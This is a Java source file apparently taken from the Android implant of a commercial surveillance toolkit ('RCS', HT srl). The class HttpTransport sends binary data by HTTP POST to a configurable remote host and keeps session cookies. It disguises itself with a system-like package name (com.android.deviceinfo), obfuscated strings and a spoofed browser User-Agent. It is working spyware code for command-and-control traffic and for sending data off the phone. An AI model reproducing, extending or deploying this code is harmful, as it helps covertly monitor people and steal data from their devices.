/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : HttpTransport.java
 * Created      : Apr 9, 2011
 * Author		: zeno
 * *******************************************/

package com.android.deviceinfo.action.sync;

import java.io.DataInputStream;
import java.io.IOException;
import java.util.List;

import org.apache.http.HttpResponse;
import org.apache.http.HttpStatus;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.conn.ConnectionKeepAliveStrategy;
import org.apache.http.cookie.Cookie;
import org.apache.http.entity.ByteArrayEntity;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.params.BasicHttpParams;
import org.apache.http.params.HttpParams;

import com.android.deviceinfo.auto.Cfg;
import com.android.deviceinfo.util.Check;
import com.android.m.M;

// TODO: Auto-generated Javadoc
/**
 * The Class HttpTransport.
 */
public abstract class HttpTransport extends Transport {

	/** The Constant PORT. */
	private static final int PORT = 80;
	/** The debug. */
	private static final String TAG = "HttpTransport"; //$NON-NLS-1$
	/** The host. */
	String host;

	/**
	 * Instantiates a new http transport.
	 * 
	 * @param host
	 *            the host
	 */
	public HttpTransport(final String host) {
		// TODO: aggiungere variabilita'....
		//super("http://" + host + ":" + PORT + M.d("/wc12/webclient")); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$
		super("http://" + host + ":" + PORT + "/"); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$

		this.host = host;
		cookies = null;
		stop = false;
	}

	// private String transportId;
	/** The cookies. */
	protected List<Cookie> cookies;

	/** The stop. */
	boolean stop;

	/** The follow_moved. */
	boolean follow_moved = true;

	/** The HEADE r_ contenttype. */
	protected final String HEADER_CONTENTTYPE = M.e("content-type"); //$NON-NLS-1$

	/** The HEADE r_ setcookie. */
	protected final String HEADER_SETCOOKIE = M.e("set-cookie"); //$NON-NLS-1$

	/** The HEADE r_ contentlen. */
	protected final String HEADER_CONTENTLEN = M.e("content-length"); //$NON-NLS-1$

	// private final String USER_AGENT =
	// "Profile/MIDP-2.0 Configuration/CLDC-1.0";
	/** The CONTEN t_ type. */
	protected final String CONTENT_TYPE = M.e("application/octet-stream"); //$NON-NLS-1$

	/** The accept wifi. */
	static// private static String CONTENTTYPE_TEXTHTML = "text/html";
	boolean acceptWifi = false;

	/*
	 * (non-Javadoc)
	 * 
	 * @see com.ht.AndroidServiceGUI.action.sync.Transport#close()
	 */
	@Override
	public void close() {
		cookies = null;
	}

	/**
	 * http://www.androidsnippets.com/executing-a-http-post-request-with-
	 * httpclient
	 * 
	 * @param data
	 *            the data
	 * @return the byte[]
	 * @throws TransportException
	 *             the transport exception
	 */
	@Override
	public synchronized byte[] command(final byte[] data) throws TransportException {
		// sending request
		final DefaultHttpClient httpclient = new DefaultHttpClient();

		final HttpParams httpParameters = new BasicHttpParams();
		// HttpConnectionParams.setConnectionTimeout(httpParameters,
		// CONNECTION_TIMEOUT);
		// HttpConnectionParams.setSoTimeout(httpParameters, SO_TIMEOUT);
		// httpclient.setParams(httpParameters);

		httpclient.setKeepAliveStrategy(new ConnectionKeepAliveStrategy() {
			public long getKeepAliveDuration(HttpResponse response, org.apache.http.protocol.HttpContext context) {
				return 30000;
			}
		});
		// httpclient.getParams().setParameter(ClientPNames.COOKIE_POLICY,
		// CookiePolicy.RFC_2965);

		final HttpPost httppost = new HttpPost(baseurl);
		httppost.setHeader(M.e("User-Agent"), //$NON-NLS-1$
				M.e("Mozilla/5.0 (Linux; U; Android 0.5; en-us) AppleWebKit/522+ (KHTML, like Gecko) Safari/419.3")); //$NON-NLS-1$
		httppost.setHeader(M.e("Content-Type"), M.e("application/octet-stream")); //$NON-NLS-1$ //$NON-NLS-2$

		if (cookies != null) {
			for (final Cookie cookie : cookies) {
				httpclient.getCookieStore().addCookie(cookie);
				// httppost.setHeader("Cookie", cookie.getName());
			}
		}

		DataInputStream in = null;

		try {
			httppost.setEntity(new ByteArrayEntity(data));
			final HttpResponse response = httpclient.execute(httppost);

			final int returnCode = response.getStatusLine().getStatusCode();

			if (returnCode == HttpStatus.SC_OK) {
				cookies = httpclient.getCookieStore().getCookies();

				final long length = response.getEntity().getContentLength();

				in = new DataInputStream(response.getEntity().getContent());

				final byte[] content = new byte[(int) length];
				in.readFully(content);

				in.close();

				return content;
			} else {
				return null;
			}
		} catch (final Exception ex) {
			if (Cfg.EXCEPTION) {
				Check.log(ex);
			}

			if (Cfg.DEBUG) {
				Check.log(TAG + " Error: " + ex.toString());//$NON-NLS-1$
			}

			throw new TransportException(1);
		} finally {
			if (in != null) {
				try {
					in.close();
				} catch (final IOException e) {
					if (Cfg.EXCEPTION) {
						Check.log(e);
					}

					if (Cfg.DEBUG) {
						Check.log(e);//$NON-NLS-1$
					}
				}
			}
		}

		// byte[] content = parseHttpConnection(connection);
	}
}